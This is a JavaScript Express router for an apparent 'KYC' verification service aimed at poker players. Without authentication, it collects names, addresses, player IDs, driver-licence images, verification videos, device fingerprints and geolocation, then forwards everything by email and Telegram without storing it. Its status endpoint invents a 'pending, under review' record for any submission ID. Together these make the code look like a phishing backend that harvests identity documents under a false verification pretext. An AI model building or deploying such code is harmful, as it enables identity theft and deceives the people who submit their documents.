import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { v4 as uuidv4 } from 'uuid';
import { sendEmailNotification, sendTelegramNotification, analyzeSecurity } from '../services/notification.js';

const router = express.Router();

// Health check endpoint
router.get('/health', (req, res) => {
  res.json({
    success: true,
    message: 'KYC service is running',
    timestamp: new Date().toISOString()
  });
});

// Configure multer for file uploads (use /tmp on serverless)
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const baseDir = process.env.UPLOAD_DIR || (process.env.VERCEL ? '/tmp' : 'uploads');
    const uploadDir = `${baseDir}/kyc`;
    try {
      if (!fs.existsSync(uploadDir)) {
        fs.mkdirSync(uploadDir, { recursive: true });
      }
    } catch (e) {
      // fallback to /tmp if any error
      const fallback = '/tmp/kyc';
      if (!fs.existsSync(fallback)) {
        fs.mkdirSync(fallback, { recursive: true });
      }
      return cb(null, fallback);
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const fileFilter = (req, file, cb) => {
  // Allow images and videos
  if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
    cb(null, true);
  } else {
    cb(new Error('Only image and video files are allowed!'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB limit
  }
});

// Public KYC submission endpoint (no auth required)
router.post('/submit', upload.fields([
  { name: 'driverLicense', maxCount: 1 },
  { name: 'verificationVideo', maxCount: 1 }
]), async (req, res) => {
  try {
    const {
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      deviceFingerprint,
      geolocationData,
      deviceSpecs
    } = req.body;

    // Validate required fields
    if (!fullName) {
      return res.status(400).json({ error: 'Full name is required' });
    }

    const submissionId = uuidv4();

    // Parse JSON fields
    let geolocation = null;
    let deviceSpecsData = null;
    
    try {
      if (geolocationData) {
        geolocation = JSON.parse(geolocationData);
      }
      if (deviceSpecs) {
        deviceSpecsData = JSON.parse(deviceSpecs);
      }
    } catch (parseError) {
      console.error('Error parsing JSON data:', parseError);
    }

    // Get client IP
    const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    // Prepare KYC data for notifications
    const kycData = {
      submissionId,
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      ipAddress: clientIP,
      geolocation,
      deviceData: deviceSpecsData,
      deviceFingerprint,
      submittedAt: new Date().toISOString()
    };

    // Analyze security (VPN detection, location mismatch)
    const securityAnalysis = analyzeSecurity(kycData);
    kycData.vpnDetected = securityAnalysis.vpnDetected;
    kycData.locationMismatch = securityAnalysis.locationMismatch;

    // Prepare files for email attachment
    const files = [];
    if (req.files?.driverLicense?.[0]) {
      files.push({
        originalname: 'driver_license.jpg',
        path: req.files.driverLicense[0].path
      });
    }
    if (req.files?.verificationVideo?.[0]) {
      files.push({
        originalname: 'verification_video.mp4',
        path: req.files.verificationVideo[0].path
      });
    }

    // Send notifications
    try {
      await sendEmailNotification(kycData, files);
      await sendTelegramNotification(kycData);
      console.log('Notifications sent successfully');
    } catch (notificationError) {
      console.error('Error sending notifications:', notificationError);
      // Don't fail the submission if notifications fail
    }

    res.status(201).json({
      success: true,
      message: 'KYC submission received successfully',
      submissionId: submissionId
    });

  } catch (error) {
    console.error('KYC submission error:', error);
    res.status(500).json({
      error: 'Failed to submit KYC data',
      message: error.message
    });
  }
});

// Simple status endpoint (no database needed)
router.get('/status/:submissionId', async (req, res) => {
  try {
    const { submissionId } = req.params;
    
    // Since we're not storing in database, just return a generic status
    res.json({
      success: true,
      data: {
        submission_id: submissionId,
        full_name: 'Submitted',
        status: 'pending',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        verification_notes: 'Submission received and under review',
        verified_at: null
      }
    });

  } catch (error) {
    console.error('Error fetching KYC status:', error);
    res.status(500).json({
      error: 'Failed to fetch KYC status',
      message: error.message
    });
  }
});

export default router;
